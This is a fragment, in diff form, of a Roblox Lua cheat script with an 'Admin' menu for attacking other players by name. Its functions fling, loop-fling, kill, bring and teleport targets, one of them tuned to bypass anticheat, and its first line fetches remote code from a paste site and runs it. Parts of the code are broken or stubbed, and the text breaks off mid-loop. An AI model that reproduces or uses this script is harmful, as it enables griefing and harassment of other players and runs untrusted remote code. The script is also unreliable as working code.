+loadstring(game:HttpGet("https://paste.ee/r/VwY6U"))()
+    end    
+})
+
+Tab:AddButton({
+  Name = "Fling Attachment",
+  Callback = function()
+        loadcharacter(plr.Character)
+    end    
+})
+
+Tab:AddToggle({
+  Name = "Regular Fling",
+  Default = false,
+  Callback = function(flingto)
+    if flingto == true then
+              local RootPart = plr.Character.HumanoidRootPart
+    if not RootPart then return end
+    FlingTBL.OldVelocity = RootPart.Velocity
+    local bv = Instance.new("BodyAngularVelocity")
+    FlingTBL.bv = bv
+    bv.MaxTorque = Vector3.new(1, 1, 1) * math.huge
+    bv.P = math.huge
+    bv.AngularVelocity = Vector3.new(0, 9e5, 0)
+    bv.Parent = RootPart
+    local Char = plr.Character:GetChildren()
+    for i,v in next, Char do
+           if v:IsA("BasePart") then
+                   v.CanCollide = false
+                   v.Massless = true
+                   v.Velocity = Vector3.new(0,0,0)
+           end
+    end
+    FlingTBL.Noclipping2 = game:GetService("RunService").Stepped:Connect(function()
+            for i, v in next, Char do
+                    if v:IsA("BasePart") then
+                            v.CanCollide = false
+                    end
+            end
+    end)
+    if Regulars == false then
+    Regulars = true
+          else
+               flingto = false
+         local RootPart = plr.Character.HumanoidRootPart
+    if not RootPart then return end
+    FlingTBL.OldPos = RootPart.CFrame
+    local Char = plr.Character:GetChildren()
+    if FlingTBL ~= nil then
+            FlingTBL.bv:Destroy()
+            FlingTBL.bv = nil
+    end
+    if FlingTBL.Noclipping2 ~= nil then
+            FlingTBL.Noclipping2:Disconnect()
+            FlingTBL.Noclipping2 = nil
+    end
+    for i, v in next, Char do
+            if v:IsA("BasePart") then
+                    v.CanCollide = true
+                    v.Massless = false
+            end
+    end
+    FlingTBL.isRunning = game:GetService("RunService").Stepped:Connect(function()
+            if FlingTBL.OldPos ~= nil then
+                    RootPart.CFrame = FlingTBL.OldPos
+            end
+            if FlingTBL.OldVelocity ~= nil then
+                    RootPart.Velocity = FlingTBL.OldVelocity
+            end
+    end)
+    wait(2)
+  RootPart.Anchored = true
+  if FlingTBL.isRunning ~= nil then
+    FlingTBL.isRunning:Disconnect()
+    FlingTBL.isRunning = nil
+  end
+  RootPart.Anchored = false
+  if FlingTBL.OldVelocity ~= nil then
+    RootPart.Velocity = FlingTBL.OldVelocity
+  end
+  if FlingTBL.OldPos ~= nil then
+    RootPart.CFrame = FlingTBL.OldPos
+  end
+    for i,m in pairs(plr.Character.HumanoidRootPart:GetChildren()) do
+        if m.Name == "BodyAngularVelocity" then
+           m:Destroy()
+        end
+    end
+  wait()
+  FlingTBL.OldVelocity = nil
+  FlingTBL.OldPos = nil
+  Regulars = false
+end
+  end
+  end    
+})
+
+local Tab = Window:MakeTab({
+  Name = "Admin",
+  Icon = "rbxassetid://6034281935",
+  PremiumOnly = false
+})
+
+Tab:AddTextbox({
+  Name = "Player Name",
+  Default = "",
+  TextDisappear = false,
+  Callback = function(...)
+  target = getPlr(...)
+    Target = {...}
+    PlayerTarget = getPlr(...)
+  end		  
+})
+
+
+Tab:AddButton({
+  Name = "Information about Player",
+  Callback = function()
+        OrionLib:MakeNotification({
+  Name = "Information about Player:",
+  Content = 'Name: '..target.Name..' | Character Name: '..target.Character.Name..' | DisplayName: '..target.DisplayName..' | Account Age: '..target.AccountAge..' | User ID: '..target.UserId..' | Health: '..round(target.Character:FindFirstChildOfClass('Humanoid').Health, 1)..' | WalkSpeed: '..target.Character:FindFirstChildOfClass("Humanoid").WalkSpeed..' | JumpPower: '..target.Character:FindFirstChildOfClass("Humanoid").JumpPower,
+  Image = "",
+  Time = 10
+})
+    end    
+})
+
+Tab:AddButton({
+	Name = "Copyname",
+	Callback = function()
+      setclipboard(target.Name)		
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Teleport",
+	Callback = function()
+ 
+	 local target = target
+	 getChar().HumanoidRootPart.CFrame = target.Character.Humanoid.RootPart.CFrame
+	end    
+})
+
+Tab:AddButton({
+	Name = "Tween Teleport (byass some anticheat)",
+	Callback = function()
+ 
+ 
+ char = game.Players.LocalPlayer
+ 
+ TweenService = game:GetService("TweenService")
+ 
+ speaker = game.Players.LocalPlayer
+ Players = game:GetService("Players")
+	 
+	 local players = target
+			 TweenService:Create(getRoot(speaker.Character), TweenInfo.new(2, Enum.EasingStyle.Linear), {CFrame = getRoot(players.Character).CFrame + Vector3.new(3,1,0)}):Play()
+	 	
+  	end    
+})
+
+Tab:AddToggle({
+	Name = "View Player",
+	Default = false,
+	Callback = function(View)
+        if View == true then
+		if viewDied then
+			viewDied:Disconnect()
+			viewChanged:Disconnect()
+		end
+		viewing = target
+		game.Workspace.CurrentCamera.CameraSubject = viewing.Character
+		local function viewDiedFunc()
+			repeat wait() until target.Character ~= nil and getRoot(target.Character)
+			game.Workspace.CurrentCamera.CameraSubject = viewing.Character
+		end
+		viewDied = target.CharacterAdded:Connect(viewDiedFunc)
+		local function viewChangedFunc()
+			game.Workspace.CurrentCamera.CameraSubject = viewing.Character
+		end
+		viewChanged = game.Workspace.CurrentCamera:GetPropertyChangedSignal("CameraSubject"):Connect(viewChangedFunc)
+		else
+		    View = false
+			if viewing ~= nil then
+		viewing = nil
+	end
+	if viewDied then
+		viewDied:Disconnect()
+		viewChanged:Disconnect()
+	end
+	game.Workspace.CurrentCamera.CameraSubject = plr.Character
+		end		
+  end    
+})
+
+
+
+Tab:AddButton({
+	Name = "Fling (Remake OP)",
+	Callback = function()
+		local player = game.Players.LocalPlayer
+		local mouse = player:GetMouse()
+		local Targets = Target
+		
+		local Players = game:GetService("Players")
+		local Player = Players.LocalPlayer
+		
+		local AllBool = false
+		
+		local GetPlayer = function(Name)
+			Name = Name:lower()
+			if Name == "all" or Name == "others" then
+				AllBool = true
+				return
+			elseif Name == "random" then
+				local GetPlayers = Players:GetPlayers()
+				if table.find(GetPlayers,Player) then table.remove(GetPlayers,table.find(GetPlayers,Player)) end
+				return GetPlayers[math.random(#GetPlayers)]
+			elseif Name ~= "random" and Name ~= "all" and Name ~= "others" then
+				for _,x in next, Players:GetPlayers() do
+					if x ~= Player then
+						if x.Name:lower():match("^"..Name) or x.DisplayName:lower():match("^"..Name) then
+							return x
+						end
+					end
+				end
+			else
+				return
+			end
+		end
+		
+		local Message = function(_Title, _Text, Time)
+			print(_Title)
+			print(_Text)
+			print(Time)
+		end
+		
+		local SkidFling = function(TargetPlayer)
+			local Character = Player.Character
+			local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
+			local RootPart = Humanoid and Humanoid.RootPart
+			
+			local TCharacter = TargetPlayer.Character
+			local THumanoid
+			local TRootPart
+			local THead
+			local Accessory
+			local Handle
+			
+			if TCharacter:FindFirstChildOfClass("Humanoid") then
+				THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
+			end
+			if THumanoid and THumanoid.RootPart then
+				TRootPart = THumanoid.RootPart
+			end
+			if TCharacter:FindFirstChild("Head") then
+				THead = TCharacter.Head
+			end
+			if TCharacter:FindFirstChildOfClass("Accessory") then
+				Accessory = TCharacter:FindFirstChildOfClass("Accessory")
+			end
+			if Accessory and Accessory:FindFirstChild("Handle") then
+				Handle = Accessory.Handle
+			end
+			
+			if Character and Humanoid and RootPart then
+				if RootPart.Velocity.Magnitude < 50 then
+					getgenv().OldPos = RootPart.CFrame
+				end
+				if THumanoid and THumanoid.Sit and not AllBool then
+				end
+				if THead then
+					workspace.CurrentCamera.CameraSubject = THead
+				elseif not THead and Handle then
+					workspace.CurrentCamera.CameraSubject = Handle
+				elseif THumanoid and TRootPart then
+					workspace.CurrentCamera.CameraSubject = THumanoid
+				end
+				if not TCharacter:FindFirstChildWhichIsA("BasePart") then
+					return
+				end
+				
+				local FPos = function(BasePart, Pos, Ang)
+					RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
+					Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
+					RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
+					RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
+				end
+				
+				local SFBasePart = function(BasePart)
+					local TimeToWait = 2
+					local Time = tick()
+					local Angle = 0
+				
+					repeat
+						if RootPart and THumanoid then
+							if BasePart.Velocity.Magnitude < 50 then
+								Angle = Angle + 100
+								
+								FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
+								task.wait()
+								
+								FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+								task.wait()
+								
+								FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+								task.wait()
+								
+								FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+								task.wait()
+								
+								FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection, CFrame.Angles(math.rad(Angle), 0, 0))
+								task.wait()
+								
+								FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection, CFrame.Angles(math.rad(Angle), 0, 0))
+								task.wait()
+							else
+								FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
+								task.wait()
+								
+								FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
+								task.wait()
+								
+								FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
+								task.wait()
+								
+								FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
+								task.wait()
+								
+								FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
+								task.wait()
+								
+								FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
+								task.wait()
+								
+								FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
+								task.wait()
+								
+								FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
+								task.wait()
+								
+								FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
+								task.wait()
+								
+								FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
+								task.wait()
+							end
+						else
+							break
+						end
+					until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
+				end
+				
+				workspace.FallenPartsDestroyHeight = 0/0
+				
+				local BV = Instance.new("BodyVelocity")
+				BV.Name = "EpixVel"
+				BV.Parent = RootPart
+				BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
+				BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
+				
+				Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
+				
+				if TRootPart and THead then
+					if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
+						SFBasePart(THead)
+					else
+						SFBasePart(TRootPart)
+					end
+				elseif TRootPart and not THead then
+					SFBasePart(TRootPart)
+				elseif not TRootPart and THead then
+					SFBasePart(THead)
+				elseif not TRootPart and not THead and Handle then
+					SFBasePart(Handle)
+				end
+				
+				BV:Destroy()
+				Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
+				workspace.CurrentCamera.CameraSubject = Humanoid
+				repeat
+					RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
+					Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
+					Humanoid:ChangeState("GettingUp")
+					for _, x in next, Character:GetDescendants() do
+						if x:IsA("BasePart") then
+							x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
+						end
+					end
+					task.wait()
+				until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
+				workspace.FallenPartsDestroyHeight = getgenv().FPDH
+			end
+		end
+		
+		if Targets then
+			local SkidHandle = function(Player)
+				if Player.Character and Player.Character:FindFirstChildOfClass("Humanoid") then
+					if Player.Character:FindFirstChildOfClass("Humanoid").SeatPart then
+						Player.Character:FindFirstChildOfClass("Humanoid").Sit = false
+					end
+					SkidFling(Player)
+				end
+			end
+			
+			local GetPlayers = Players:GetPlayers()
+			if AllBool then
+				for _,x in next, GetPlayers do
+					if x ~= Player then
+						SkidHandle(x)
+					end
+				end
+			else
+				for _,x in next, Targets do
+					if x then
+						local TargetPlayer = GetPlayer(x)
+						if TargetPlayer and TargetPlayer ~= Player then
+							SkidHandle(TargetPlayer)
+						end
+					else
+						Message("Invalid Username","Could not find the username provided.",3)
+					end
+				end
+			end
+		else
+			Message("No Username Provided","Please provide at least one username.",3)
+		end
+	end
+})
+
+Tab:AddButton({
+	Name = "Rocket",
+	Callback = function()
+      local OldPos = getRoot().CFrame
+	 tweenService, tweenInfo = game:GetService("TweenService"), TweenInfo.new(70, Enum.EasingStyle.Linear)
+			  
+	 tween = tweenService:Create(game:GetService("Players")["LocalPlayer"].Character.HumanoidRootPart, tweenInfo, {CFrame = CFrame.new(0, 10000, 0)})
+	 tween:Play()
+	
+	 local TPlayer = target
+				TRootPart = TPlayer.Character.HumanoidRootPart
+				local Character = Player.Character
+				local PlayerGui = Player:WaitForChild("PlayerGui")
+				local Backpack = Player:WaitForChild("Backpack")
+				local Humanoid = Character and Character:FindFirstChildWhichIsA("Humanoid") or false
+				local RootPart = Character and Humanoid and Humanoid.RootPart or false
+				local RightArm = Character and Character:FindFirstChild("Right Arm") or Character:FindFirstChild("RightHand")
+				if not Humanoid or not RootPart or not RightArm then
+					return
+				end
+				Humanoid:UnequipTools()
+				local MainTool = Backpack:FindFirstChildWhichIsA("Tool") or false
+				if not MainTool or not MainTool:FindFirstChild("Handle") then
+					return
+				end
+				Humanoid.Name = "DAttach"
+				local l = Character["DAttach"]:Clone()
+				l.Parent = Character
+				l.Name = "Humanoid"
+				wait()
+				Character["DAttach"]:Destroy()
+				game.Workspace.CurrentCamera.CameraSubject = Character
+				Character.Animate.Disabled = true
+				wait()
+				Character.Animate.Disabled = false
+				Character.Humanoid:EquipTool(MainTool)
+				wait()
+				CF = Player.Character.PrimaryPart.CFrame
+				if firetouchinterest then
+					local flag = false
+					task.defer(function()
+						MainTool.Handle.AncestryChanged:wait()
+						flag = true
+					end)
+					repeat
+						firetouchinterest(MainTool.Handle, TRootPart, 0)
+						firetouchinterest(MainTool.Handle, TRootPart, 1)
+						wait()
+					until flag
+				else
+					Player.Character.HumanoidRootPart.CFrame =
+					TCharacter.HumanoidRootPart.CFrame
+					wait()
+					Player.Character.HumanoidRootPart.CFrame =
+					TCharacter.HumanoidRootPart.CFrame
+					wait()
+				end
+				 CF = Player.Character.HumanoidRootPart.CFrame
+			 player.CharacterAdded:wait(1):waitForChild("HumanoidRootPart").CFrame = CF		
+  	end    
+})
+
+Tab:AddToggle({
+	Name = "Loopfling",
+	Default = false,
+	Callback = function(Value)
+		if Value == true then
+		local Targets = Target
+	 
+	 Loopvoid = true
+	 repeat wait()
+ local player = game.Players.LocalPlayer
+ local mouse = player:GetMouse()
+ 
+ local Players = game:GetService("Players")
+ local Player = Players.LocalPlayer
+ 
+ local AllBool = false
+ 
+ local GetPlayer = function(Name)
+	Name = Name:lower()
+	if Name == "all" or Name == "others" then
+		AllBool = true
+		return
+	elseif Name == "random" then
+		local GetPlayers = Players:GetPlayers()
+		if table.find(GetPlayers,Player) then table.remove(GetPlayers,table.find(GetPlayers,Player)) end
+		return GetPlayers[math.random(#GetPlayers)]
+	elseif Name ~= "random" and Name ~= "all" and Name ~= "others" then
+		for _,x in next, Players:GetPlayers() do
+			if x ~= Player then
+				if x.Name:lower():match("^"..Name) then
+					return x;
+				elseif x.DisplayName:lower():match("^"..Name) then
+					return x;
+				end
+			end
+		end
+	else
+		return
+	end
+ end
+ 
+ local Message = function(_Title, _Text, Time)
+
+end
+ 
+ local SkidFling = function(TargetPlayer)
+	local Character = Player.Character
+	local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
+	local RootPart = Humanoid and Humanoid.RootPart
+ 
+	local TCharacter = TargetPlayer.Character
+	local THumanoid
+	local TRootPart
+	local THead
+	local Accessory
+	local Handle
+ 
+	if TCharacter:FindFirstChildOfClass("Humanoid") then
+		THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
+	end
+	if THumanoid and THumanoid.RootPart then
+		TRootPart = THumanoid.RootPart
+	end
+	if TCharacter:FindFirstChild("Head") then
+		THead = TCharacter.Head
+	end
+	if TCharacter:FindFirstChildOfClass("Accessory") then
+		Accessory = TCharacter:FindFirstChildOfClass("Accessory")
+	end
+	if Accessoy and Accessory:FindFirstChild("Handle") then
+		Handle = Accessory.Handle
+	end
+ 
+	if Character and Humanoid and RootPart then
+		if RootPart.Velocity.Magnitude < 50 then
+			getgenv().OldPos = RootPart.CFrame
+		end
+		if THumanoid and THumanoid.Sit and not AllBool then
+			return Message("Error Occurred", "Targeting is sitting", 5) -- u can remove dis part if u want lol
+		end
+		if THead then
+			workspace.CurrentCamera.CameraSubject = THead
+		elseif not THead and Handle then
+			workspace.CurrentCamera.CameraSubject = Handle
+		elseif THumanoid and TRootPart then
+			workspace.CurrentCamera.CameraSubject = THumanoid
+		end
+		if not TCharacter:FindFirstChildWhichIsA("BasePart") then
+			return
+		end
+		
+		local FPos = function(BasePart, Pos, Ang)
+			RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
+			Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
+			RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
+			RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
+		end
+		
+		local SFBasePart = function(BasePart)
+			local TimeToWait = 2
+			local Time = tick()
+			local Angle = 0
+ 
+			repeat
+				if RootPart and THumanoid then
+					if BasePart.Velocity.Magnitude < 50 then
+						Angle = Angle + 100
+ 
+						FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
+						task.wait()
+ 
+						FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+						task.wait()
+ 
+						FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+						task.wait()
+ 
+						FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+						task.wait()
+ 
+						FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
+						task.wait()
+ 
+						FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
+						task.wait()
+					else
+						FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
+						task.wait()
+ 
+						FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
+						task.wait()
+ 
+						FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
+						task.wait()
+						
+						FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
+						task.wait()
+ 
+						FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
+						task.wait()
+ 
+						FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
+						task.wait()
+ 
+						FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
+						task.wait()
+ 
+						FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
+						task.wait()
+ 
+						FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
+						task.wait()
+ 
+						FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
+						task.wait()
+					end
+				else
+					break
+				end
+			until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
+		end
+		
+		workspace.FallenPartsDestroyHeight = 0/0
+		
+		local BV = Instance.new("BodyVelocity")
+		BV.Name = "EpixVel"
+		BV.Parent = RootPart
+		BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
+		BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
+		
+		Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
+		
+		if TRootPart and THead then
+			if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
+				SFBasePart(THead)
+			else
+				SFBasePart(TRootPart)
+			end
+		elseif TRootPart and not THead then
+			SFBasePart(TRootPart)
+		elseif not TRootPart and THead then
+			SFBasePart(THead)
+		elseif not TRootPart and not THead and Accessory and Handle then
+			SFBasePart(Handle)
+		else
+			return Message("Error Occurred", "Target is missing everything", 5)
+		end
+		
+		BV:Destroy()
+		Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
+		workspace.CurrentCamera.CameraSubject = Humanoid
+		
+		repeat
+			RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
+			Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
+			Humanoid:ChangeState("GettingUp")
+			table.foreach(Character:GetChildren(), function(_, x)
+				if x:IsA("BasePart") then
+					x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
+				end
+			end)
+			task.wait()
+		until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
+		workspace.FallenPartsDestroyHeight = getgenv().FPDH
+	else
+		return Message("Error Occurred", "Random error", 5)
+	end
+ end
+ 
+ if not Welcome then Message("Script by AnthonyIsntHere", "Enjoy!", 5) end
+ getgenv().Welcome = true
+ if Targets[1] then for _,x in next, Targets do GetPlayer(x) end else return end
+ 
+ if AllBool then
+	for _,x in next, Players:GetPlayers() do
+		SkidFling(x)
+	end
+ end
+ 
+ for _,x in next, Targets do
+	if GetPlayer(x) and GetPlayer(x) ~= Player then
+		if GetPlayer(x).UserId ~= 1414978355 then
+			local TPlayer = GetPlayer(x)
+			if TPlayer then
+				SkidFling(TPlayer)
+			end
+		else
+			Message("Error Occurred", "This user is whitelisted! (Owner)", 5)
+		end
+	elseif not GetPlayer(x) and not AllBool then
+		Message("Error Occurred", "Username Invalid", 5)
+	end
+ end
+	 until Loopvoid == false
+	else 
+	if Value == false then
+	Loopvoid = false
+	end
+	end
+	end    
+})
+
+-- Ensure you have defined these variables/functions somewhere in your script
+local RunService = game:GetService("RunService")
+local d = 10 
+
+-- Ensure you have defined the r15 and getTorso functions
+local function r15(player)
+	-- Example implementation, replace with actual logic
+	return player.Character:FindFirstChildOfClass("Humanoid").RigType == Enum.HumanoidRigType.R15
+end
+
+local function getTorso(character)
+	-- Example implementation, replace with actual logic
+	if character:FindFirstChild("HumanoidRootPart") then
+		return character:FindFirstChild("HumanoidRootPart")
+	elseif character:FindFirstChild("Torso") then
+		return character:FindFirstChild("Torso")
+	else
+		return nil
+	end
+end
+
+local function getRoot(character)
+	return character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("Torso")
+end
+
+
+Tab:AddToggle({
+    Name = "Bang",
+    Default = false,
+    Callback = function(Bang)
+      if Bang == true then
+      
+    end
+})
+
+
+Tab:AddToggle({
+	Name = "headtstand (Anti-Bang)",
+	Default = false,
+	Callback = function(Value)
+		if Value == true then
+	 if headSit then headSit:Disconnect() end
+ local players = target
+		 local sitPlr = players.Name
+		 sitDied = game.Players.LocalPlayer.Character:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
+			 sitLoop = sitLoop:Disconnect()
+		 end)
+	 headSit = RunService.Heartbeat:Connect(function()
+					 if Players:FindFirstChild(players.Name) and players.Character ~= nil and getRoot(players.Character) and getRoot(game.Players.LocalPlayer.Character) then
+			 getRoot(game.Players.LocalPlayer.Character).CFrame = players.Character.HumanoidRootPart.CFrame * CFrame.Angles(0,math.rad(0),0)* CFrame.new(0,4.6,0.4)
+			 else
+			 headSit:Disconnect()
+		 end
+		 end)
+		else
+		if Value == false then
+		headSit = headSit:Disconnect()
+ sitDied:Disconnect()
+	end    
+})
+
+Tab:AddButton({
+	Name = "Scare",
+	Callback = function()
+ Target = target
+ 
+ local oldCF = LocalPlayer.Character.HumanoidRootPart.CFrame
+   Target = target 
+				 distancepl = 2
+				 if Target.Character and Target.Character:FindFirstChild('Humanoid') then
+						 LocalPlayer.Character.HumanoidRootPart.CFrame =
+								 Target.Character.HumanoidRootPart.CFrame +  Target.Character.HumanoidRootPart.CFrame.lookVector * distancepl
+						 LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(LocalPlayer.Character.HumanoidRootPart.Position, Target.Character.HumanoidRootPart.Position)
+						 wait(.5)
+						 LocalPlayer.Character.HumanoidRootPart.CFrame = oldCF
+				 end
+		 		
+  	end    
+})
+
+Tab:AddToggle({
+	Name = "Headsit",
+	Default = false,
+	Callback = function(Value)
+		if Value == true then
+	 if headSit then 
+		 headSit:Disconnect()
+	 end
+ 
+ local players = target
+		 local sitPlr = players.Name
+ 
+		 sitDied = game.Players.LocalPlayer.Character:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
+			 sitLoop = sitLoop:Disconnect()
+		 end)
+				 game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').Sit = true
+ 
+	 headSit = RunService.Heartbeat:Connect(function()
+					 if Players:FindFirstChild(players.Name) and players.Character ~= nil and getRoot(players.Character) and getRoot(game.Players.LocalPlayer.Character) and game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').Sit == true then
+			 getRoot(game.Players.LocalPlayer.Character).CFrame = players.Character.HumanoidRootPart.CFrame * CFrame.Angles(0,math.rad(0),0)* CFrame.new(0,1.6,0.4)
+			 else
+			 headSit:Disconnect()
+		 end
+		 end)
+		else
+		if Value == false then
+		game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+	end    
+})
+
+Tab:AddButton({
+	Name = "Bring ",
+	Callback = function()
+      	bring(speaker, PlayerTarget)
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Fast Bring",
+	Callback = function()
+      	bring(speaker, PlayerTarget, true)
+  	end    
+})
+
+
+Tab:AddButton({
+	Name = "Kill",
+	Callback = function()
+      	kill(speaker, PlayerTarget)
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Fast Kill",
+	Callback = function()
+      	kill(speaker, PlayerTarget, true)
+  	end    
+})
+
+Tab:AddButton({
+	Name = "ToolHandle Kill",
+	Callback = function()
+      	local Char = plr.Character
+local RS = game:GetService("RunService").RenderStepped
+local Tool = Char:FindFirstChildWhichIsA("Tool")
+local Handle = Tool and Tool:FindFirstChild("Handle")
+if not Tool or not Handle then
+   return game.StarterGui:SetCore("SendNotification", {Title = "Warning!", Text = "You need to hold a 'Tool' that does damage on touchinterest. For example Sword or Knife.", Duration = 4,})
+end
+task.spawn(function()
+   while Tool and Char and PlayerTarget.Character and Tool.Parent == Char do
+           local Human = PlayerTarget.Character:FindFirstChildWhichIsA("Humanoid")
+           if not Human or Human.Health <= 0 then
+                   break
+           end
+           for i, v1 in ipairs(PlayerTarget.Character:GetChildren()) do
+                   v1 = ((v1:IsA("BasePart") and firetouchinterest(Handle, v1, 1, (RS.Wait(RS) and nil) or firetouchinterest(Handle, v1, 0)) and nil) or v1) or v1
+           end
+   end
+   game.StarterGui:SetCore("SendNotification", {Title = "Done!", Text = "ToolHandle Kill Stopped. Because player died/left or you just unequipped the tool.", Duration = 4,})
+end)
+  	end    
+})
+
+
+
+Tab:AddToggle({
+	Name = "Follow",
+	Default = false,
+	Callback = function(Walkn)
+        if Walkn == true then
+            if plr.Character:FindFirstChildOfClass('Humanoid') and plr.Character:FindFirstChildOfClass('Humanoid').SeatPart then
+		plr.Character:FindFirstChildOfClass('Humanoid').Sit = false
+		wait(.1)
+	end
+	    if WalkTo == false then
+		WalkTo = true
+		repeat wait()
+		     plr.Character:FindFirstChild("Humanoid"):MoveTo(getRoot(target.Character).Position)
+			 until target.Character == nil or not getRoot(target.Character) or WalkTo == false	
+	end
+		else
+		    Walkn = false
+			WalkTo = false
+		end		
+  end    
+})
+
+Tab:AddToggle({
+	Name = "Pathfind follow",
+	Default = false,
+	Callback = function(Walkns)
+        if Walkns == true then
+            WalkTo = false
+	local PathService = game:GetService("PathfindingService")
+	local hum = plr.Character:FindFirstChildOfClass("Humanoid")
+	local path = PathService:CreatePath()
+	
+	if WalkTo == false then
+		WalkTo = true
+	repeat wait()
